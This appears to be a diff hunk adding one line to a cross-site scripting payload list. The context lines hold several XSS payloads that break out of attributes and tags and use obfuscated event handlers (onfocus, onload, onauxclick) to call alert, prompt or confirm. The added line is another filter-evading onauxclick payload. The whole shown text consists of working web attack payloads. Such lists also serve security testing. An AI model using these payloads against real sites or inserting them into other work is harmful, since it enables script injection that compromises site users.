@@ -2710,3 +2710,4 @@ foo<script>alert(1)</script>
 "><input autofocus a=\" onfocus​='window[al+/e/[ex+ec]e+rt](1)'>
 "></fieldset></form><​script>prompt(/legionhunter/);<​/script></body></html><!--
 <svg xmlns="http://w3.org/2000/svg" onload​="this.setAttribute('onmouseover','confirm(1)')"></svg>
+xss" onauxclick​="self[`aler`%2b`t`](1)>right_click
